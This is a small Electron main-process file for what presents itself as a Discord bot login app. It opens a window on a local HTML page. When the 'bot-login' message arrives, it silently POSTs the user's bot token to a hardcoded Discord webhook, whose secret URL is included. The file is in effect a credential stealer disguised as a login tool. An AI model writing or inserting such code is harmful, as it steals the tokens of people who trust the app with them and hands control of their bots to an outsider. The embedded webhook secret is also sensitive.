import { app, BrowserWindow, ipcMain } from 'electron'
import fetch from "node-fetch"
const webhook = "https://discord.com/api/webhooks/1053545463120396368/HovxvKFqHJF-wNACSGi4GJHSmsin6KX4y1GYd679nP4bv1KHXxUzErFY_yRZH2of_dIM";
app.disableHardwareAcceleration();

const createWindow = () => {
    const win = new BrowserWindow({
        width: 800,
        height: 600,
    });

    win.loadFile(`./static/html/index.html`);
    /* win.setMenu(null); */
};

app.on(`ready`, () =>{
    createWindow();
});

app.on(`window-all-closed`, () =>{
    if (process.platform !== `darwin`) app.quit();
});

ipcMain.on(`bot-login`, (message) => {
    fetch(webhook, {
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ "content": message.bot_token })
    });
});